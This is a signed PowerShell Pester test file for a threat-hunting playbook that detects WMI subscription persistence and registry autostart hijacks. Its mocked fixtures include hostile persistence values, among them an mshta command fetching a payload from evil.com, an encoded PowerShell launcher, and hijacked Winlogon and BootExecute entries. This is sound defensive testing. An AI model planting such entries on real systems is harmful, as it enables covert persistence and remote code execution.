<#
.SYNOPSIS
    Pester 5 Tests for GAP-F01 and GAP-F02
    GAP-F01: WMI subscription triplet (EventFilter + FilterToConsumerBinding + EventConsumer)
    GAP-F02: Expanded persistence keys (RunOnce, Winlogon, BootExecute, startup folders)
#>

BeforeAll {
    $SrcPath = Join-Path $PSScriptRoot "..\..\playbooks\windows\threat_hunting\dev\src"
    . (Join-Path $SrcPath "00_Parameters_And_Globals.ps1")
    . (Join-Path $SrcPath "02_Fileless_And_Registry.ps1")

    # Shared baseline - suppresses all side-effect calls so individual tests
    # can opt-in only to what they need. Defined here so execution phase sees it.
    function script:Set-FilelessBaselineMocks {
        Mock Get-CimInstance      { @() }
        Mock Get-WmiObject        { @() }
        Mock Get-BitsTransfer     { @() }
        Mock Invoke-LsassDumpHunt {}
        Mock Test-Path            { $false }
        Mock Get-ItemProperty     { [PSCustomObject]@{} }
        Mock Get-ChildItem        { @() }
    }
}

# ---------------------------------------------------------------------------
# GAP-F01: WMI Subscription Triplet
# ---------------------------------------------------------------------------
Describe "GAP-F01 WMI Subscription Detection" {

    BeforeEach {
        $script:Findings = @()
        $script:Quiet    = $true
        Set-FilelessBaselineMocks
    }

    It "Should flag a complete WMI subscription as High with query and action in Details" {
        $fakeConsumer = [PSCustomObject]@{ Name = 'EvilConsumer'; CommandLineTemplate = 'cmd /c evil.bat'; ScriptText = '' }
        $fakeFilter   = [PSCustomObject]@{ Name = 'EvilFilter';   Query = 'SELECT * FROM __InstanceModificationEvent' }
        $fakeBinding  = [PSCustomObject]@{
            Consumer = '__EventConsumer.Name="EvilConsumer"'
            Filter   = '__EventFilter.Name="EvilFilter"'
        }
        Mock Get-CimInstance { @($fakeConsumer) } -ParameterFilter { $ClassName -eq '__EventConsumer' }
        Mock Get-CimInstance { @($fakeFilter)   } -ParameterFilter { $ClassName -eq '__EventFilter' }
        Mock Get-CimInstance { @($fakeBinding)  } -ParameterFilter { $ClassName -eq '__FilterToConsumerBinding' }

        Invoke-FilelessHunt

        $f = $script:Findings | Where-Object { $_.Type -eq 'WMI Persistence' -and $_.Severity -eq 'High' }
        $f | Should -HaveCount 1
        $f[0].Target  | Should -Match 'EvilConsumer'
        $f[0].Target  | Should -Match 'EvilFilter'
        $f[0].Details | Should -Match 'Query='
        $f[0].Details | Should -Match 'Action='
    }

    It "Should skip known-good consumers BVTConsumer and SCM Event Log Consumer" {
        $fakeConsumer = [PSCustomObject]@{ Name = 'BVTConsumer'; CommandLineTemplate = ''; ScriptText = '' }
        $fakeBinding  = [PSCustomObject]@{
            Consumer = '__EventConsumer.Name="BVTConsumer"'
            Filter   = '__EventFilter.Name="BVTFilter"'
        }
        Mock Get-CimInstance { @($fakeConsumer) } -ParameterFilter { $ClassName -eq '__EventConsumer' }
        Mock Get-CimInstance { @()              } -ParameterFilter { $ClassName -eq '__EventFilter' }
        Mock Get-CimInstance { @($fakeBinding)  } -ParameterFilter { $ClassName -eq '__FilterToConsumerBinding' }

        Invoke-FilelessHunt

        ($script:Findings | Where-Object { $_.Type -eq 'WMI Persistence' }) | Should -HaveCount 0
    }

    It "Should flag an unbound consumer (no matching binding) as Medium" {
        $fakeConsumer = [PSCustomObject]@{ Name = 'OrphanConsumer'; CommandLineTemplate = 'powershell -enc AAAA'; ScriptText = '' }
        Mock Get-CimInstance { @($fakeConsumer) } -ParameterFilter { $ClassName -eq '__EventConsumer' }
        Mock Get-CimInstance { @()              } -ParameterFilter { $ClassName -eq '__EventFilter' }
        Mock Get-CimInstance { @()              } -ParameterFilter { $ClassName -eq '__FilterToConsumerBinding' }

        Invoke-FilelessHunt

        $f = $script:Findings | Where-Object { $_.Type -eq 'WMI Persistence' -and $_.Severity -eq 'Medium' }
        $f | Should -HaveCount 1
        $f[0].Target | Should -Match 'OrphanConsumer'
    }

    It "Should produce no WMI findings when all subscription namespaces are empty" {
        Invoke-FilelessHunt
        ($script:Findings | Where-Object { $_.Type -eq 'WMI Persistence' }) | Should -HaveCount 0
    }
}

# ---------------------------------------------------------------------------
# GAP-F02: RunOnce
# ---------------------------------------------------------------------------
Describe "GAP-F02 RunOnce Persistence Detection" {

    BeforeEach {
        $script:Findings = @()
        $script:Quiet    = $true
        Set-FilelessBaselineMocks
    }

    It "Should flag a LOLBin in HKLM RunOnce as High" {
        Mock Test-Path { $true } -ParameterFilter {
            $Path -eq 'HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce'
        }
        Mock Get-ItemProperty {
            [PSCustomObject]@{ Updater = 'powershell -enc AAABBB' }
        } -ParameterFilter {
            $Path -eq 'HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce'
        }

        Invoke-FilelessHunt

        $f = $script:Findings | Where-Object { $_.Type -eq 'Suspicious Registry Key' -and $_.Target -match 'RunOnce' }
        $f | Should -HaveCount 1
        $f[0].Severity | Should -Be 'High'
        $f[0].Details  | Should -Match 'powershell'
    }

    It "Should detect LOLBin entry in HKCU RunOnce" {
        Mock Test-Path { $true } -ParameterFilter {
            $Path -eq 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce'
        }
        Mock Get-ItemProperty {
            [PSCustomObject]@{ Persist = 'mshta http://evil.com/payload.hta' }
        } -ParameterFilter {
            $Path -eq 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce'
        }

        Invoke-FilelessHunt

        $f = $script:Findings | Where-Object { $_.Type -eq 'Suspicious Registry Key' -and $_.Target -match 'RunOnce' }
        $f | Should -HaveCount 1
        $f[0].Details | Should -Match 'mshta'
    }
}

# ---------------------------------------------------------------------------
# GAP-F02: Winlogon Hijack
# ---------------------------------------------------------------------------
Describe "GAP-F02 Winlogon Hijack Detection" {

    BeforeEach {
        $script:Findings = @()
        $script:Quiet    = $true
        Set-FilelessBaselineMocks
    }

    It "Should flag a modified Userinit value as High" {
        Mock Test-Path { $true } -ParameterFilter {
            $Path -match 'Winlogon'
        }
        Mock Get-ItemProperty {
            [PSCustomObject]@{ Userinit = 'C:\Windows\system32\userinit.exe, evil.exe'; Shell = 'explorer.exe' }
        } -ParameterFilter {
            $Path -match 'Winlogon'
        }

        Invoke-FilelessHunt

        $f = $script:Findings | Where-Object { $_.Type -eq 'Winlogon Hijack' }
        $f | Should -HaveCount 1
        $f[0].Severity | Should -Be 'High'
        $f[0].Details  | Should -Match 'evil\.exe'
    }

    It "Should flag a modified Shell value as High" {
        Mock Test-Path { $true } -ParameterFilter { $Path -match 'Winlogon' }
        Mock Get-ItemProperty {
            [PSCustomObject]@{ Userinit = 'C:\Windows\system32\userinit.exe,'; Shell = 'explorer.exe, backdoor.exe' }
        } -ParameterFilter { $Path -match 'Winlogon' }

        Invoke-FilelessHunt

        $f = $script:Findings | Where-Object { $_.Type -eq 'Winlogon Hijack' }
        $f | Should -HaveCount 1
        $f[0].Details | Should -Match 'backdoor'
    }

    It "Should NOT flag standard Userinit and Shell values" {
        Mock Test-Path { $true } -ParameterFilter { $Path -match 'Winlogon' }
        Mock Get-ItemProperty {
            [PSCustomObject]@{ Userinit = 'C:\Windows\system32\userinit.exe,'; Shell = 'explorer.exe' }
        } -ParameterFilter { $Path -match 'Winlogon' }

        Invoke-FilelessHunt

        ($script:Findings | Where-Object { $_.Type -eq 'Winlogon Hijack' }) | Should -HaveCount 0
    }
}

# ---------------------------------------------------------------------------
# GAP-F02: BootExecute
# ---------------------------------------------------------------------------
Describe "GAP-F02 BootExecute Persistence Detection" {

    BeforeEach {
        $script:Findings = @()
        $script:Quiet    = $true
        Set-FilelessBaselineMocks
    }

    It "Should flag a non-standard BootExecute entry as Critical" {
        Mock Test-Path { $true } -ParameterFilter { $Path -match 'Session Manager' }
        Mock Get-ItemProperty {
            [PSCustomObject]@{ BootExecute = @('autocheck autochk *', 'evil.exe /run') }
        } -ParameterFilter {
            $Path -match 'Session Manager' -and $Name -eq 'BootExecute'
        }

        Invoke-FilelessHunt

        $f = $script:Findings | Where-Object { $_.Type -eq 'BootExecute Persistence' }
        $f | Should -HaveCount 1
        $f[0].Severity | Should -Be 'Critical'
        $f[0].Details  | Should -Match 'evil\.exe'
    }

    It "Should NOT flag the standard autocheck autochk entry" {
        Mock Test-Path { $true } -ParameterFilter { $Path -match 'Session Manager' }
        Mock Get-ItemProperty {
            [PSCustomObject]@{ BootExecute = @('autocheck autochk *') }
        } -ParameterFilter {
            $Path -match 'Session Manager' -and $Name -eq 'BootExecute'
        }

        Invoke-FilelessHunt

        ($script:Findings | Where-Object { $_.Type -eq 'BootExecute Persistence' }) | Should -HaveCount 0
    }
}

# SIG # Begin signature block
# MIIcDgYJKoZIhvcNAQcCoIIb/zCCG/sCAQExDzANBglghkgBZQMEAgEFADB5Bgor
# BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG
# KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCCvBHktzYLtOVXn
# BFUeMwx2s8plZ94U68Ey23hI3oifCqCCFlIwggMUMIIB/KADAgECAhAfQMjwyAWn
# lEKgkjdOOOytMA0GCSqGSIb3DQEBCwUAMCIxIDAeBgNVBAMMF0lSIFRvb2xraXQg
# Q29kZSBTaWduaW5nMB4XDTI2MDYyNjAyMjc0OFoXDTI5MDYyNjAyMzc0OFowIjEg
# MB4GA1UEAwwXSVIgVG9vbGtpdCBDb2RlIFNpZ25pbmcwggEiMA0GCSqGSIb3DQEB
# AQUAA4IBDwAwggEKAoIBAQCVM7HdfviXfsMldvVuCmIVeX2nhTRWSA3FnoNQ7zd2
# lsAZuL+EkM+xZ6OiH6L5B6gZsCree2lTU0n0aNdSbNxKgzfaxFL49pteZwFI3ooS
# E+sqbAHRlG7UYrB90qWqPy6L2nh0ntu7R3IPzCbhTl6wgdT3e4axY+Bt4zZqcGY4
# XNolYl32o1h6/Xn1RDbK2RTsIblxuVYfYLdCotMldxNkE3oXBItZUoiGYNyCbnS0
# pBeBzKuJ7110b3jMhW5euch+jNqPlo7xwpAy57ut6LB/F/apn5BMhVXL0BsSIISW
# bvDg8KnX0ryWSVzEhCRDULbHFHceT8KT0j22yIYBIe19AgMBAAGjRjBEMA4GA1Ud
# DwEB/wQEAwIHgDATBgNVHSUEDDAKBggrBgEFBQcDAzAdBgNVHQ4EFgQUY4Zdh7We
# EeqWTl4U+JyMI+/Bv44wDQYJKoZIhvcNAQELBQADggEBAGADp8Vqkz5dS0PaRLED
# IuTzMDd6t33jfUATEmnXvHWcir5zyCZhwz+iyGI8atBuTvD9t4skDJNEf+niZneM
# Ql2/lr6nz/cGlWdZjgOAdIsj4I3MSrAwXN7fK5QjyXcCUQpzTfBifVshB7vl3006
# QYE2GwXHWt5/rJKNRHKXBdtuw9XL1iUtmgQOwHhLJ4F//Lf59Fon5KGP7Hmt8tJv
# HrfolpKc7pF7XKyO3grw2sOz7BnmVYBRGTAhVJ+E/+IFAPUsThQFila4LAsvqCPv
# 265GLrtTUiXjZOcQ0LT5ohZWcvU4fpQ3b473zxrl0IpfARI5XSlTC/T6arQoRyXU
# 4QwwggWNMIIEdaADAgECAhAOmxiO+dAt5+/bUOIIQBhaMA0GCSqGSIb3DQEBDAUA
# MGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsT
# EHd3dy5kaWdpY2VydC5jb20xJDAiBgNVBAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQg
# Um9vdCBDQTAeFw0yMjA4MDEwMDAwMDBaFw0zMTExMDkyMzU5NTlaMGIxCzAJBgNV
# BAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdp
# Y2VydC5jb20xITAfBgNVBAMTGERpZ2lDZXJ0IFRydXN0ZWQgUm9vdCBHNDCCAiIw
# DQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIBAL/mkHNo3rvkXUo8MCIwaTPswqcl
# LskhPfKK2FnC4SmnPVirdprNrnsbhA3EMB/zG6Q4FutWxpdtHauyefLKEdLkX9YF
# PFIPUh/GnhWlfr6fqVcWWVVyr2iTcMKyunWZanMylNEQRBAu34LzB4TmdDttceIt
# DBvuINXJIB1jKS3O7F5OyJP4IWGbNOsFxl7sWxq868nPzaw0QF+xembud8hIqGZX
# V59UWI4MK7dPpzDZVu7Ke13jrclPXuU15zHL2pNe3I6PgNq2kZhAkHnDeMe2scS1
# ahg4AxCN2NQ3pC4FfYj1gj4QkXCrVYJBMtfbBHMqbpEBfCFM1LyuGwN1XXhm2Tox
# RJozQL8I11pJpMLmqaBn3aQnvKFPObURWBf3JFxGj2T3wWmIdph2PVldQnaHiZdp
# ekjw4KISG2aadMreSx7nDmOu5tTvkpI6nj3cAORFJYm2mkQZK37AlLTSYW3rM9nF
# 30sEAMx9HJXDj/chsrIRt7t/8tWMcCxBYKqxYxhElRp2Yn72gLD76GSmM9GJB+G9
# t+ZDpBi4pncB4Q+UDCEdslQpJYls5Q5SUUd0viastkF13nqsX40/ybzTQRESW+UQ
# UOsxxcpyFiIJ33xMdT9j7CFfxCBRa2+xq4aLT8LWRV+dIPyhHsXAj6KxfgommfXk
# aS+YHS312amyHeUbAgMBAAGjggE6MIIBNjAPBgNVHRMBAf8EBTADAQH/MB0GA1Ud
# DgQWBBTs1+OC0nFdZEzfLmc/57qYrhwPTzAfBgNVHSMEGDAWgBRF66Kv9JLLgjEt
# UYunpyGd823IDzAOBgNVHQ8BAf8EBAMCAYYweQYIKwYBBQUHAQEEbTBrMCQGCCsG
# AQUFBzABhhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wQwYIKwYBBQUHMAKGN2h0
# dHA6Ly9jYWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRFJvb3RD
# QS5jcnQwRQYDVR0fBD4wPDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29t
# L0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDARBgNVHSAECjAIMAYGBFUdIAAw
# DQYJKoZIhvcNAQEMBQADggEBAHCgv0NcVec4X6CjdBs9thbX979XB72arKGHLOyF
# XqkauyL4hxppVCLtpIh3bb0aFPQTSnovLbc47/T/gLn4offyct4kvFIDyE7QKt76
# LVbP+fT3rDB6mouyXtTP0UNEm0Mh65ZyoUi0mcudT6cGAxN3J0TU53/oWajwvy8L
# punyNDzs9wPHh6jSTEAZNUZqaVSwuKFWjuyk1T3osdz9HNj0d1pcVIxv76FQPfx2
# CWiEn2/K2yCNNWAcAgPLILCsWKAOQGPFmCLBsln1VWvPJ6tsds5vIy30fnFqI2si
# /xK4VC0nftg62fC2h5b9W9FcrBjDTZ9ztwGpn1eqXijiuZQwgga0MIIEnKADAgEC
# AhANx6xXBf8hmS5AQyIMOkmGMA0GCSqGSIb3DQEBCwUAMGIxCzAJBgNVBAYTAlVT
# MRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5j
# b20xITAfBgNVBAMTGERpZ2lDZXJ0IFRydXN0ZWQgUm9vdCBHNDAeFw0yNTA1MDcw
# MDAwMDBaFw0zODAxMTQyMzU5NTlaMGkxCzAJBgNVBAYTAlVTMRcwFQYDVQQKEw5E
# aWdpQ2VydCwgSW5jLjFBMD8GA1UEAxM4RGlnaUNlcnQgVHJ1c3RlZCBHNCBUaW1l
# U3RhbXBpbmcgUlNBNDA5NiBTSEEyNTYgMjAyNSBDQTEwggIiMA0GCSqGSIb3DQEB
# AQUAA4ICDwAwggIKAoICAQC0eDHTCphBcr48RsAcrHXbo0ZodLRRF51NrY0NlLWZ
# loMsVO1DahGPNRcybEKq+RuwOnPhof6pvF4uGjwjqNjfEvUi6wuim5bap+0lgloM
# 2zX4kftn5B1IpYzTqpyFQ/4Bt0mAxAHeHYNnQxqXmRinvuNgxVBdJkf77S2uPoCj
# 7GH8BLuxBG5AvftBdsOECS1UkxBvMgEdgkFiDNYiOTx4OtiFcMSkqTtF2hfQz3zQ
# Sku2Ws3IfDReb6e3mmdglTcaarps0wjUjsZvkgFkriK9tUKJm/s80FiocSk1VYLZ
# lDwFt+cVFBURJg6zMUjZa/zbCclF83bRVFLeGkuAhHiGPMvSGmhgaTzVyhYn4p0+
# 8y9oHRaQT/aofEnS5xLrfxnGpTXiUOeSLsJygoLPp66bkDX1ZlAeSpQl92QOMeRx
# ykvq6gbylsXQskBBBnGy3tW/AMOMCZIVNSaz7BX8VtYGqLt9MmeOreGPRdtBx3yG
# OP+rx3rKWDEJlIqLXvJWnY0v5ydPpOjL6s36czwzsucuoKs7Yk/ehb//Wx+5kMqI
# MRvUBDx6z1ev+7psNOdgJMoiwOrUG2ZdSoQbU2rMkpLiQ6bGRinZbI4OLu9BMIFm
# 1UUl9VnePs6BaaeEWvjJSjNm2qA+sdFUeEY0qVjPKOWug/G6X5uAiynM7Bu2ayBj
# UwIDAQABo4IBXTCCAVkwEgYDVR0TAQH/BAgwBgEB/wIBADAdBgNVHQ4EFgQU729T
# SunkBnx6yuKQVvYv1Ensy04wHwYDVR0jBBgwFoAU7NfjgtJxXWRM3y5nP+e6mK4c
# D08wDgYDVR0PAQH/BAQDAgGGMBMGA1UdJQQMMAoGCCsGAQUFBwMIMHcGCCsGAQUF
# BwEBBGswaTAkBggrBgEFBQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEEG
# CCsGAQUFBzAChjVodHRwOi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRU
# cnVzdGVkUm9vdEc0LmNydDBDBgNVHR8EPDA6MDigNqA0hjJodHRwOi8vY3JsMy5k
# aWdpY2VydC5jb20vRGlnaUNlcnRUcnVzdGVkUm9vdEc0LmNybDAgBgNVHSAEGTAX
# MAgGBmeBDAEEAjALBglghkgBhv1sBwEwDQYJKoZIhvcNAQELBQADggIBABfO+xaA
# HP4HPRF2cTC9vgvItTSmf83Qh8WIGjB/T8ObXAZz8OjuhUxjaaFdleMM0lBryPTQ
# M2qEJPe36zwbSI/mS83afsl3YTj+IQhQE7jU/kXjjytJgnn0hvrV6hqWGd3rLAUt
# 6vJy9lMDPjTLxLgXf9r5nWMQwr8Myb9rEVKChHyfpzee5kH0F8HABBgr0UdqirZ7
# bowe9Vj2AIMD8liyrukZ2iA/wdG2th9y1IsA0QF8dTXqvcnTmpfeQh35k5zOCPmS
# Nq1UH410ANVko43+Cdmu4y81hjajV/gxdEkMx1NKU4uHQcKfZxAvBAKqMVuqte69
# M9J6A47OvgRaPs+2ykgcGV00TYr2Lr3ty9qIijanrUR3anzEwlvzZiiyfTPjLbnF
# RsjsYg39OlV8cipDoq7+qNNjqFzeGxcytL5TTLL4ZaoBdqbhOhZ3ZRDUphPvSRmM
# Thi0vw9vODRzW6AxnJll38F0cuJG7uEBYTptMSbhdhGQDpOXgpIUsWTjd6xpR6oa
# Qf/DJbg3s6KCLPAlZ66RzIg9sC+NJpud/v4+7RWsWCiKi9EOLLHfMR2ZyJ/+xhCx
# 9yHbxtl5TPau1j/1MIDpMPx0LckTetiSuEtQvLsNz3Qbp7wGWqbIiOWCnb5WqxL3
# /BAPvIXKUjPSxyZsq8WhbaM2tszWkPZPubdcMIIG7TCCBNWgAwIBAgIQCoDvGEuN
# 8QWC0cR2p5V0aDANBgkqhkiG9w0BAQsFADBpMQswCQYDVQQGEwJVUzEXMBUGA1UE
# ChMORGlnaUNlcnQsIEluYy4xQTA/BgNVBAMTOERpZ2lDZXJ0IFRydXN0ZWQgRzQg
# VGltZVN0YW1waW5nIFJTQTQwOTYgU0hBMjU2IDIwMjUgQ0ExMB4XDTI1MDYwNDAw
# MDAwMFoXDTM2MDkwMzIzNTk1OVowYzELMAkGA1UEBhMCVVMxFzAVBgNVBAoTDkRp
# Z2lDZXJ0LCBJbmMuMTswOQYDVQQDEzJEaWdpQ2VydCBTSEEyNTYgUlNBNDA5NiBU
# aW1lc3RhbXAgUmVzcG9uZGVyIDIwMjUgMTCCAiIwDQYJKoZIhvcNAQEBBQADggIP
# ADCCAgoCggIBANBGrC0Sxp7Q6q5gVrMrV7pvUf+GcAoB38o3zBlCMGMyqJnfFNZx
# +wvA69HFTBdwbHwBSOeLpvPnZ8ZN+vo8dE2/pPvOx/Vj8TchTySA2R4QKpVD7dvN
# Zh6wW2R6kSu9RJt/4QhguSssp3qome7MrxVyfQO9sMx6ZAWjFDYOzDi8SOhPUWlL
# nh00Cll8pjrUcCV3K3E0zz09ldQ//nBZZREr4h/GI6Dxb2UoyrN0ijtUDVHRXdmn
# cOOMA3CoB/iUSROUINDT98oksouTMYFOnHoRh6+86Ltc5zjPKHW5KqCvpSduSwhw
# UmotuQhcg9tw2YD3w6ySSSu+3qU8DD+nigNJFmt6LAHvH3KSuNLoZLc1Hf2JNMVL
# 4Q1OpbybpMe46YceNA0LfNsnqcnpJeItK/DhKbPxTTuGoX7wJNdoRORVbPR1VVnD
# uSeHVZlc4seAO+6d2sC26/PQPdP51ho1zBp+xUIZkpSFA8vWdoUoHLWnqWU3dCCy
# FG1roSrgHjSHlq8xymLnjCbSLZ49kPmk8iyyizNDIXj//cOgrY7rlRyTlaCCfw7a
# SUROwnu7zER6EaJ+AliL7ojTdS5PWPsWeupWs7NpChUk555K096V1hE0yZIXe+gi
# AwW00aHzrDchIc2bQhpp0IoKRR7YufAkprxMiXAJQ1XCmnCfgPf8+3mnAgMBAAGj
# ggGVMIIBkTAMBgNVHRMBAf8EAjAAMB0GA1UdDgQWBBTkO/zyMe39/dfzkXFjGVBD
# z2GM6DAfBgNVHSMEGDAWgBTvb1NK6eQGfHrK4pBW9i/USezLTjAOBgNVHQ8BAf8E
# BAMCB4AwFgYDVR0lAQH/BAwwCgYIKwYBBQUHAwgwgZUGCCsGAQUFBwEBBIGIMIGF
# MCQGCCsGAQUFBzABhhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wXQYIKwYBBQUH
# MAKGUWh0dHA6Ly9jYWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFRydXN0ZWRH
# NFRpbWVTdGFtcGluZ1JTQTQwOTZTSEEyNTYyMDI1Q0ExLmNydDBfBgNVHR8EWDBW
# MFSgUqBQhk5odHRwOi8vY3JsMy5kaWdpY2VydC5jb20vRGlnaUNlcnRUcnVzdGVk
# RzRUaW1lU3RhbXBpbmdSU0E0MDk2U0hBMjU2MjAyNUNBMS5jcmwwIAYDVR0gBBkw
# FzAIBgZngQwBBAIwCwYJYIZIAYb9bAcBMA0GCSqGSIb3DQEBCwUAA4ICAQBlKq3x
# HCcEua5gQezRCESeY0ByIfjk9iJP2zWLpQq1b4URGnwWBdEZD9gBq9fNaNmFj6Eh
# 8/YmRDfxT7C0k8FUFqNh+tshgb4O6Lgjg8K8elC4+oWCqnU/ML9lFfim8/9yJmZS
# e2F8AQ/UdKFOtj7YMTmqPO9mzskgiC3QYIUP2S3HQvHG1FDu+WUqW4daIqToXFE/
# JQ/EABgfZXLWU0ziTN6R3ygQBHMUBaB5bdrPbF6MRYs03h4obEMnxYOX8VBRKe1u
# NnzQVTeLni2nHkX/QqvXnNb+YkDFkxUGtMTaiLR9wjxUxu2hECZpqyU1d0IbX6Wq
# 8/gVutDojBIFeRlqAcuEVT0cKsb+zJNEsuEB7O7/cuvTQasnM9AWcIQfVjnzrvwi
# CZ85EE8LUkqRhoS3Y50OHgaY7T/lwd6UArb+BOVAkg2oOvol/DJgddJ35XTxfUlQ
# +8Hggt8l2Yv7roancJIFcbojBcxlRcGG0LIhp6GvReQGgMgYxQbV1S3CrWqZzBt1
# R9xJgKf47CdxVRd/ndUlQ05oxYy2zRWVFjF7mcr4C34Mj3ocCVccAvlKV9jEnstr
# niLvUxxVZE/rptb7IRE2lskKPIJgbaP5t2nGj/ULLi49xTcBZU8atufk+EMF/cWu
# iC7POGT75qaL6vdCvHlshtjdNXOCIUjsarfNZzGCBRIwggUOAgEBMDYwIjEgMB4G
# A1UEAwwXSVIgVG9vbGtpdCBDb2RlIFNpZ25pbmcCEB9AyPDIBaeUQqCSN0447K0w
# DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq
# hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC
# NwIBFTAvBgkqhkiG9w0BCQQxIgQgROX0mmCllq5VmSlWTrA1P1q6JRP+RxEeky/a
# SN6m2b8wDQYJKoZIhvcNAQEBBQAEggEAeOJ4eB3HGClzk78sn2HFS7sPE2+RCHli
# SSxp2hcdL4yrAdR5vEW60Mm/AiNJWLqnnFw+BgRAOpa0sg0vkcimAtH+aoJGgTtn
# GM9j/8ZpraSswA+wbp/Jq8khUJK12iTKGABheQzzcx6alTf71AjDKyUekpymnLhh
# TjYrLoVWzPBH2C7I7ZxUK1vxQ+Z4AzxGBkL4HLmTOq6U3z2DrJv2N0tOfE8GTXFp
# wOEBR2Ofu+it8gDI8Vg1OsGXRtmB/C2GpzJQlNK5AOgCPfukss1GUgjB8qKrl6FG
# 1WM41DJU5LXnz05EWIMEg6/cwu3S/IvohD4iBgxqOu+c7eTG5Ok+vqGCAyYwggMi
# BgkqhkiG9w0BCQYxggMTMIIDDwIBATB9MGkxCzAJBgNVBAYTAlVTMRcwFQYDVQQK
# Ew5EaWdpQ2VydCwgSW5jLjFBMD8GA1UEAxM4RGlnaUNlcnQgVHJ1c3RlZCBHNCBU
# aW1lU3RhbXBpbmcgUlNBNDA5NiBTSEEyNTYgMjAyNSBDQTECEAqA7xhLjfEFgtHE
# dqeVdGgwDQYJYIZIAWUDBAIBBQCgaTAYBgkqhkiG9w0BCQMxCwYJKoZIhvcNAQcB
# MBwGCSqGSIb3DQEJBTEPFw0yNjA2MjYyMzI3MzdaMC8GCSqGSIb3DQEJBDEiBCAF
# itZq7M6PKu67GciosT/SlwX0io+ySDjsNVl3GOsa0jANBgkqhkiG9w0BAQEFAASC
# AgCJdSeVRNAYIfYmXBO+ejWv5Wjb7S37/6MA1YkGTMJwCZm9Z+2dyNYF4p6FU98V
# NJQS4RCj600bbadnWVCOthHK1fICv9R7ym8sgJEoiopCJmnoJCe3cBYLa/knzXq8
# AinG5P1zWx346fqtlBqfzBTubE2bF0IVoLVTyTCsdBN486vVfBbn5Nf/3wAmH4C0
# GUj4MgIDaIbxMZn7qOharEuuQ43y3qGEEH+kJiVTU7V6vEB3hu0atg/rFDC8chTn
# Dr91WG7PvOr37a09o/Elg6bMRmAyEOM/aDHDTMne0mSG3FHACtx238+IUTAnI6d/
# pqAApbJX3vOC2kz51pDZweFemVT/TWg87vrD9jc29P7kRaYJ30hUW8Z7RH82eGAG
# b/dnF1W1XZ+Ysxw6darrxNcQggmlL8FDrqM7Br+ESvfCm5/JZpFfCbg+TvlPCW6y
# w7VtTdOKBHDdmHVikhNyAV/aQl560jifkXkHoxTJShRvMg+L6B6U9yDj03eVsnZ1
# PNA7p+kxcEp0HHEoxRAaqxQ0t1f/SLw7JNFta1LFiqRkyXQ8WD0qG8oYvxIA0/cI
# 1WjJS8h/tZDQ/ERDYwP2anSn/fomsHDhUT0+hmgY7ACe5XLl/nhzsdJW13GyZu37
# US9CMbpCJSAhwSMbK3BCFyU7hwWFrt2Flq/dHR+9DUqIpw==
# SIG # End signature block
